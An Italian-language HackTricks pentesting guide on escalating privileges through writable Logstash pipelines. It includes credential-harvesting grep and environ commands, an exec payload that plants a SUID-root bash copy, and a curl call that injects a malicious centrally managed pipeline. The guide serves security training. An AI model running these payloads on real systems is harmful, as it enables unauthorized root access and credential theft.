# Escalation dei privilegi con Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash viene utilizzato per **raccogliere, trasformare e distribuire i log** attraverso un sistema noto come **pipeline**. Queste pipeline sono composte da fasi di **input**, **filtro** e **output**. Un aspetto interessante si presenta quando Logstash opera su una macchina compromessa.

### Configurazione della pipeline

Le pipeline sono configurate nel file **/etc/logstash/pipelines.yml**, che elenca i percorsi delle configurazioni delle pipeline:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Questo file rivela dove si trovano i file **.conf** contenenti le configurazioni delle pipeline. Quando si utilizza un **Elasticsearch output module**, è comune che le **pipeline** includano le **credenziali di Elasticsearch**, che spesso dispongono di privilegi estesi a causa della necessità di Logstash di scrivere dati in Elasticsearch. I wildcard nei percorsi di configurazione consentono a Logstash di eseguire tutte le pipeline corrispondenti nella directory designata.

Se Logstash viene avviato con `-f <directory>` invece di `pipelines.yml`, **tutti i file all'interno di quella directory vengono concatenati in ordine lessicografico e analizzati come un'unica config**. Questo crea 2 implicazioni offensive:

- Un file aggiunto, come `000-input.conf` o `zzz-output.conf`, può modificare il modo in cui viene assemblata la pipeline finale
- Un file malformato può impedire il caricamento dell'intera pipeline, quindi valida attentamente i payload prima di fare affidamento sull'auto-reload

### Fast Enumeration su un Host compromesso

Su una macchina su cui è installato Logstash, esamina rapidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Verifica inoltre se l'API di monitoraggio locale è raggiungibile. Per impostazione predefinita, ascolta su **127.0.0.1:9600**, il che di solito è sufficiente dopo aver ottenuto l'accesso all'host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Questo di solito fornisce gli ID delle pipeline, i dettagli del runtime e la conferma che la pipeline modificata è stata caricata.

Le **Credentials** recuperate da Logstash spesso consentono di accedere a **Elasticsearch**, quindi consulta [questa pagina su Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Per tentare una privilege escalation, identifica innanzitutto l'utente con cui è in esecuzione il servizio Logstash, in genere l'utente **logstash**. Assicurati di soddisfare **uno** dei seguenti criteri:

- Possiedi **write access** a un file **.conf** di una pipeline **oppure**
- Il file **/etc/logstash/pipelines.yml** utilizza un wildcard e puoi scrivere nella cartella di destinazione

Inoltre, deve essere soddisfatta **una** delle seguenti condizioni:

- Possibilità di riavviare il servizio Logstash **oppure**
- Nel file **/etc/logstash/logstash.yml** è impostato **config.reload.automatic: true**

Se nella configurazione è presente un wildcard, la creazione di un file che corrisponde a questo wildcard consente l'esecuzione di comandi. Ad esempio:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Qui, **interval** determina la frequenza di esecuzione in secondi. Nell'esempio fornito, il comando **whoami** viene eseguito ogni 120 secondi, con il relativo output reindirizzato a **/tmp/output.log**.

Con **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, Logstash rileverà e applicherà automaticamente le configurazioni delle pipeline nuove o modificate senza richiedere un riavvio.<sup>[[1]](#references)</sup> In assenza di un wildcard, è comunque possibile apportare modifiche alle configurazioni esistenti, ma si consiglia cautela per evitare interruzioni.

### Payload di Pipeline più affidabili

Il plugin di input `exec` funziona ancora nelle release attuali e richiede un `interval` o una `schedule`. Esegue il comando tramite **forking** della JVM di Logstash; pertanto, se la memoria è insufficiente, il payload potrebbe fallire con `ENOMEM` invece di essere eseguito silenziosamente.

Un payload di privilege-escalation più pratico è solitamente quello che lascia un artefatto persistente:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Se non disponi dei permessi per riavviare il processo, ma puoi inviargli segnali, Logstash supporta anche un reload attivato da **SIGHUP** sui sistemi Unix-like:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Tieni presente che non tutti i plugin supportano il reload. Ad esempio, l'input **stdin** impedisce il reload automatico, quindi non dare per scontato che `config.reload.automatic` rilevi sempre le modifiche.<sup>[[1]](#references)</sup>

### Sottrarre segreti da Logstash

Prima di concentrarti esclusivamente sull'esecuzione di codice, raccogli i dati a cui Logstash ha già accesso:

- Le credenziali in chiaro sono spesso hardcodate negli output `elasticsearch {}`, in `http_poller`, negli input JDBC o nelle impostazioni relative al cloud
- Le impostazioni protette possono trovarsi in **`/etc/logstash/logstash.keystore`** o in un'altra directory `path.settings`
- La password del keystore viene spesso fornita tramite **`LOGSTASH_KEYSTORE_PASS`**, e le installazioni basate su pacchetti la ricavano comunemente da **`/etc/sysconfig/logstash`**
- L'espansione delle variabili d'ambiente con `${VAR}` viene risolta all'avvio di Logstash, quindi vale la pena ispezionare l'ambiente del servizio

Controlli utili:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Vale la pena controllare anche questo, perché **CVE-2023-46672** ha mostrato che Logstash poteva registrare informazioni sensibili nei log in circostanze specifiche. Su un host post-exploitation, i vecchi log di Logstash e le voci di `journald` potrebbero quindi divulgare credenziali anche se la configurazione attuale fa riferimento al keystore invece di memorizzare i secret inline.<sup>[[3]](#references)</sup>

### Abuso della gestione centralizzata delle pipeline

In alcuni ambienti, l'host **non** si basa affatto su file `.conf` locali. Se è configurato **`xpack.management.enabled: true`**, Logstash può recuperare pipeline gestite centralmente da Elasticsearch/Kibana e, dopo l'abilitazione di questa modalità, le configurazioni locali delle pipeline non sono più la source of truth.<sup>[[2]](#references)</sup>

Questo implica un diverso attack path:

1. Recuperare le credenziali Elastic dalle impostazioni locali di Logstash, dal keystore o dai log
2. Verificare se l'account dispone del privilegio cluster **`manage_logstash_pipelines`**
3. Creare o sostituire una pipeline gestita centralmente, in modo che l'host Logstash esegua il tuo payload al successivo intervallo di polling

L'API Elasticsearch utilizzata per questa funzionalità è:<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Questo è particolarmente utile quando i file locali sono in sola lettura, ma Logstash è già registrato per recuperare le pipeline da remoto.

## Riferimenti

- [1] [Elastic Docs: Ricaricamento del file di configurazione](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Configurazione della gestione centralizzata delle pipeline](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Aggiornamento di sicurezza di Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
